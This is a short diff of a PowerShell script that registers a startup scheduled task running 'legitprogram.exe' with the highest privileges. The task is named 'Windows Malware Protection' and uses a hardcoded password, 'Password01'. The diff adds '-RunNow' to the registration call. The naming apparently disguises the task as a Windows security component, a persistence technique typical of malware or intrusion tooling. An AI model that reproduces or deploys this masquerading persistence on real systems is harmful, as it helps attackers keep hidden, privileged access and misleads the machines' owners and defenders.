@@ -24,4 +24,4 @@ $Username = (Get-WmiObject -Class Win32_ComputerSystem -Property Name).Name + "\
 $Password = "Password01"
 $trigger = New-JobTrigger -AtStartup
 $action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
-Register-ScheduledTask -Action $action -Trigger $trigger -RunLevel Highest -User $Username -Password $Password -TaskName "Windows Malware Protection"
+Register-ScheduledTask -Action $action -Trigger $trigger -RunLevel Highest -User $Username -Password $Password -RunNow -TaskName "Windows Malware Protection"
